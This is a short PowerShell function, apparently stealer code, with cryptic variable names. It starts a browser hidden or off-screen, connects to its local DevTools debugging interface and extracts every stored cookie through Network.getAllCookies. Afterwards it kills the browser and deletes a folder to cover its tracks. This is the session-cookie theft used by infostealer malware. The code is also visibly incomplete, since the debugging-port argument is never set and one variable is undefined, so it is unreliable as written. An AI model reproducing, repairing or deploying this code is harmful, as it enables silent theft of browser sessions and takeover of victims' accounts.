function x($e,$d,$p,$hl){

 if($hl){$g+="--headless=new"}else{$g+="--window-position=-3000,-3000";$g+="--window-size=200,200"}

 $pr=saps $e -ArgumentList $g -PassThru -WindowStyle Hidden
 $u=$null
 1..48|%{Start-Sleep -Milliseconds 250
  try{$u=(irm "http://127.0.0.1:$p/json/version" -TimeoutSec 2).webSocketDebuggerUrl;break}catch{}}

 try{
  $w=New-Object Net.WebSockets.ClientWebSocket;$c=[Threading.CancellationToken]::None
  $w.ConnectAsync([Uri]$u,$c).Wait(8000)
  $b={param($z) New-Object ArraySegment[byte] -ArgumentList @(,[Text.Encoding]::UTF8.GetBytes($z))}
  $w.SendAsync((& $b '{"id":1,"method":"Network.enable"}'),'Text',$true,$c).Wait(8000)
  $w.SendAsync((& $b '{"id":2,"method":"Network.getAllCookies"}'),'Text',$true,$c).Wait(8000)
  $m=New-Object IO.MemoryStream;$q=New-Object byte[] 262144;$z=''
  for($i=0;$i -lt 400;$i++){
   $k=$w.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$q)),$c).Result
   $m.Write($q,0,$k.Count)
   if($k.EndOfMessage){$z=[Text.Encoding]::UTF8.GetString($m.ToArray());if($z -match '"id":2'){break};$m.SetLength(0)}}
  $w.Dispose();return (ConvertFrom-Json $z).result.cookies
 }catch{return $null}
 finally{spps $pr -Force -EA 0;rm $y -Recurse -Force -EA 0}}
